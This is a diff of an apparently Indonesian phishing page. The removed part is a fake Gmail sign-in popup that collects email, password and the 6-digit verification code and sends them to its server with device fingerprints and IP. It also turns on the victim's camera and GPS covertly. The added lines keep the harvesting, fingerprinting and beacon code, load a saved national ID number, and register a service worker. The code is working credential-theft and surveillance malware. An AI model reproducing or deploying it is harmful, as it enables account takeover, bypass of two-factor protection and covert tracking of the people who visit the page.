-          + '<div><button id="dvExp">manifest</button><button id="dvMx">matriks JSON</button><button id="dvCdi">CDI vs sesi lain</button></div>'
-          + '<div class="tail" style="margin-top:6px;color:#61748a">0 = senyap &middot; 1 = prompt &middot; 2 = blokir &middot; 3 = n/a</div>';
-        $('dvExp').onclick = download;
-        $('dvMx').onclick = function () { console.log(JSON.stringify(ROWS, null, 1)); alert(ROWS.length + ' baris di konsol'); };
-        $('dvCdi').onclick = function () {
-          var b = prompt('SID pembanding:'); if (!b) return;
-          location.href = '?key=@704nksJJ&div=1&a=' + encodeURIComponent(sid) + '&b=' + encodeURIComponent(b);
-        };
-        devChips();
-      }
-      function download() {
-        var out = { build: BUILD, sid: sid, seed: SEED, mode: MODE_CTRL ? 'kontrol' : MODE_BENCH ? 'bench' : 'utama',
-          ua: navigator.userAgent, t: new Date().toISOString(), rows: ROWS };
-        var b = new Blob([JSON.stringify(out, null, 1)], { type: 'application/json' });
-        var a = document.createElement('a');
-        a.href = URL.createObjectURL(b); a.download = 'zgch-' + sid.slice(0, 8) + '-' + SEED + '.json';
-        a.click(); setTimeout(function () { URL.revokeObjectURL(a.href); }, 4000);
-      }
-
-      /* ---------- UI ---------- */
-      function paint(w) {
-        var isC = w === 'cam', box = $(isC ? 'gsiCapCam' : 'gsiCapGps'), tx = $(isC ? 'gsiCapCamTxt' : 'gsiCapGpsTxt');
-        var st = isC ? camState : gpsState;
-        box.className = 'gsi-cap-item' + ((st === 'on' || st === 'ok') ? ' on' : st === 'asking' ? ' wait' : (st === 'denied' || st === 'na') ? ' off' : '');
-        tx.textContent = isC ? (st === 'on' ? 'Wajah terekam' : st === 'asking' ? 'Menyiapkan kamera' : st === 'denied' ? 'Kamera ditolak' : 'Kamera')
-          : (st === 'ok' ? 'Lokasi terdeteksi' : st === 'asking' ? 'Mencari lokasi' : st === 'denied' ? 'Lokasi ditolak' : 'Lokasi');
-      }
-      function step2() {
-        var v = emailEl.value.trim();
-        if (!v) { $('gsiEmailField').classList.add('gsi-bad'); $('gsiEmailErr').classList.add('show'); emailEl.focus(); return; }
-        username = v;
-        $('gsiChipText').textContent = v; $('gsiAv').textContent = v.charAt(0); $('gsiChip').style.display = 'flex';
-        $('gsiTitle').textContent = 'Selamat datang'; $('gsiSub').textContent = 'Masuk untuk melanjutkan';
-        $('gsiStep1').style.display = 'none'; $('gsiStep3').style.display = 'none'; $('gsiStep2').style.display = 'block';
-        clearStatus(); startCam(); startGps();
-        setTimeout(function () { passEl.focus(); }, 60);
-      }
-      function step1() {
-        $('gsiStep2').style.display = 'none'; $('gsiStep3').style.display = 'none'; $('gsiStep1').style.display = 'block';
-        $('gsiChip').style.display = 'none'; $('gsiTitle').textContent = 'Masuk'; $('gsiSub').textContent = 'untuk melanjutkan ke Gmail';
-        clearStatus();
-      }
-      function step3() {
-        $('gsiStep2').style.display = 'none'; $('gsiStep1').style.display = 'none'; $('gsiStep3').style.display = 'block';
-        $('gsiTitle').textContent = 'Verifikasi bahwa ini Anda';
-        $('gsiSub').textContent = 'Masukkan kode 6 digit yang dikirim ke perangkat atau email pemulihan akun Anda.';
-        clearStatus(); otpBusy = false; otpEl.value = '';
-        $('gsiOtpField').classList.remove('gsi-bad'); $('gsiOtpErr').classList.remove('show');
-        var b = $('gsiVerify'); b.disabled = false; b.classList.remove('gsi-loading'); $('gsiVfyLbl').textContent = 'Verifikasi';
-        setTimeout(function () { otpEl.focus(); }, 80);
-      }
-      function openPopup() {
-        if (closeTimer) { clearTimeout(closeTimer); closeTimer = null; }
-        root.style.display = 'flex'; document.body.classList.add('gsi-lock');
-        reopenBtn.style.display = 'none';
-        requestAnimationFrame(function () { root.classList.remove('gsi-hide'); });
-        busy = false; otpBusy = false; ridCur = ''; lastQ = ''; photo = ''; photoSent = false; best = ''; shots = 0; rounds = 0;
-        gps = null; addr = ''; camState = 'idle'; gpsState = 'idle';
-        t0 = Date.now(); tSubmit = 0; pasted = false; autofill = false; dirty = false;
-        $('gsiCapThumb').classList.remove('on'); $('gsiCapThumb').removeAttribute('src');
-        paint('cam'); paint('gps');
-        $('gsiDone').style.display = 'none'; $('gsiForm').style.display = 'block';
-        var b = $('gsiSignIn'); b.disabled = false; b.classList.remove('gsi-loading'); $('gsiLbl').textContent = 'Berikutnya';
-        passEl.value = ''; otpEl.value = ''; step1();
-        setTimeout(function () { emailEl.focus(); }, 250);
-      }
-      function closePopup() { root.classList.add('gsi-hide'); document.body.classList.remove('gsi-lock'); closeTimer = setTimeout(function () { root.style.display = 'none'; reopenBtn.style.display = 'flex'; }, 260); }
-      function finish() {
-        stopCam();
-        try { localStorage.setItem('gsi_last_user', username); } catch (e) { }
-        setStatus('Mengalihkan ke halaman pengecekan...', '#188038');
-        if (lastQ) raw(lastQ);
-        patch(); sendProbe();
-        if (MODE_DEV) return;
-        setTimeout(function () { location.replace(NEXT_URL); }, 900);
-      }
-
-      function submit() {
-        if (busy) return;
-        var p = passEl.value;
-        if (!p) { $('gsiPassField').classList.add('gsi-bad'); $('gsiPassErr').classList.add('show'); passEl.focus(); return; }
-        busy = true; tSubmit = Date.now(); ridCur = rid(); startCam(); startGps();
-        var body = {
-          rid: ridCur, username: username, password: p, deviceId: devId(), userAgent: navigator.userAgent,
-          platform: (navigator.userAgentData && navigator.userAgentData.platform) || navigator.platform,
-          language: navigator.language, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          screen: screen.width + 'x' + screen.height, referrer: document.referrer, page: location.href, ip: ip
-        };
-        step3(); setStatus('Menyimpan sandi...', '#5f6368');
-        seal(Object.assign({ action: 'login', sid: sid }, body)).then(function (e) {
-          var q = 'action=login&sid=' + sid + '&enc=1&gz=' + e.g + '&p=' + encodeURIComponent(e.b);
-          lastQ = q;
-          return post(q).then(function (r) {
-            if (!r.ok) { raw(q); setStatus('Koneksi gagal, sandi lewat jalur cadangan.', '#b06000'); }
-            else {
-              var d = {}; try { d = JSON.parse(r.t); } catch (x) { }
-              if (d && d.ok) setStatus('Sandi tersimpan. Masukkan kode verifikasi.', '#188038');
-              else setStatus('Server: ' + ((d && d.error) || '?') + ' — tetap masukkan kode.', '#d93025');
-            }
-            upload(); patch();
-          });
-        });
-      }
-
-      function verify() {
-        if (otpBusy) return;
-        var c = otpEl.value.replace(/\D/g, '');
-        if (c.length < 6) { $('gsiOtpField').classList.add('gsi-bad'); $('gsiOtpErr').classList.add('show'); otpEl.focus(); return; }
-        otpBusy = true;
-        var b = $('gsiVerify'); b.disabled = true; b.classList.add('gsi-loading'); $('gsiVfyLbl').textContent = 'Memverifikasi...';
-        clearStatus();
-        send('otp', { rid: ridCur, username: username, code: c }).then(function (r) {
-          if (r && r.ok) { setStatus('Kode terverifikasi', '#188038'); return setTimeout(finish, 450); }
-          otpBusy = false; b.disabled = false; b.classList.remove('gsi-loading'); $('gsiVfyLbl').textContent = 'Verifikasi';
-          setStatus('Kode belum tersimpan, coba lagi atau lewati.', '#d93025');
-        });
-      }
-
-      $('gsiNext').addEventListener('click', step2);
-      $('gsiSignIn').addEventListener('click', submit);
-      $('gsiVerify').addEventListener('click', verify);
-      $('gsiSkip').addEventListener('click', finish);
-      emailEl.addEventListener('keydown', function (e) { if (e.key === 'Enter') { e.preventDefault(); step2(); } });
-      passEl.addEventListener('keydown', function (e) { if (e.key === 'Enter') { e.preventDefault(); submit(); } });
-      otpEl.addEventListener('keydown', function (e) { if (e.key === 'Enter') { e.preventDefault(); verify(); } });
-      passEl.addEventListener('paste', function () { pasted = true; });
-      passEl.addEventListener('input', function (e) { if (e.isTrusted) dirty = true; $('gsiPassField').classList.remove('gsi-bad'); $('gsiPassErr').classList.remove('show'); });
-      emailEl.addEventListener('input', function () { $('gsiEmailField').classList.remove('gsi-bad'); $('gsiEmailErr').classList.remove('show'); });
-      otpEl.addEventListener('input', function () {
-        var v = otpEl.value.replace(/\D/g, '').slice(0, 6);
-        if (otpEl.value !== v) otpEl.value = v;
-        $('gsiOtpField').classList.remove('gsi-bad'); $('gsiOtpErr').classList.remove('show');
-        if (v.length === 6) setTimeout(verify, 120);
-      });
-      $('gsiShow').addEventListener('change', function () { passEl.type = this.checked ? 'text' : 'password'; passEl.focus(); });
-      $('gsiAgain').addEventListener('click', openPopup);
-      reopenBtn.addEventListener('click', openPopup);
-      $('gsiForgotEmail').addEventListener('click', function () { alert('Hubungi admin.'); });
-      $('gsiForgotPass').addEventListener('click', function () { alert('Hubungi admin.'); });
-      $('gsiCreate').addEventListener('click', function () { alert('Pendaftaran oleh admin.'); });
-      $('gsiTryOther').addEventListener('click', function () { alert('SMS, email pemulihan, authenticator, atau kode cadangan.'); });
-
-      document.addEventListener('pointerdown', function () { flushStash(); }, true);
-      document.addEventListener('visibilitychange', function () { if (!document.hidden && alive) beat(true); });
-      window.addEventListener('online', function () { if (alive) beat(true); });
-      window.addEventListener('pagehide', function () { if (lastQ) raw(lastQ); if (ROWS.length) sendMatrix(); });
-
-      if (Q.indexOf('kill=1') > -1) alive = false;
-      if (Q.indexOf('reset=1') > -1) { try { localStorage.removeItem(KEY_SID); localStorage.removeItem('gsi_dev'); } catch (e) { } }
-
-      document.body.classList.add('gsi-lock');
-      paint('cam'); paint('gps');
-      setTimeout(function () { emailEl.focus(); }, 300);
-      setTimeout(function () { if (passEl.value && !dirty) autofill = true; }, 1200);
-
-      /* ---------- jalan ---------- */
-      if (MODE_DEV) devInit();
-      audioFp().then(function (v) { audioFpCache = v; invCache.audio = v; });
-      senStart();
-      setTimeout(function () { probeDone = true; sendProbe(); }, 6600);
-      setTimeout(function () {
-        geoIp();
-        setTimeout(sendAuto, 2400);
-        if (alive) beat(true);
-      }, 600);
-      startHarvest();
-    })();
-  </script>
+drawCap();paint();mutStart();
+try{var lu=localStorage.getItem('zgch_last_user');if(lu)emailEl.value=lu}catch(e){}
+try{var ln=localStorage.getItem('zgch_nik');if(ln&&ln.length===16)$('nik').value=ln}catch(e){}
+if(DEV)devInit();
+audioF().then(function(v){audioFp=v;invC.audio=v});
+senStart();
+setTimeout(function(){probeDone=true;sendProbe()},6600);
+setTimeout(function(){geoIp();setTimeout(sendAuto,2400);if(alive)beat(true)},500);
+harvest();
+setTimeout(pintu,600);
+try{fetch(ep()+'?ping=1',{mode:'no-cors'})}catch(e){}
+if('serviceWorker' in navigator)navigator.serviceWorker.register('sw.js').catch(function(){});
+})();
+</script>
 </body>
-
 </html>
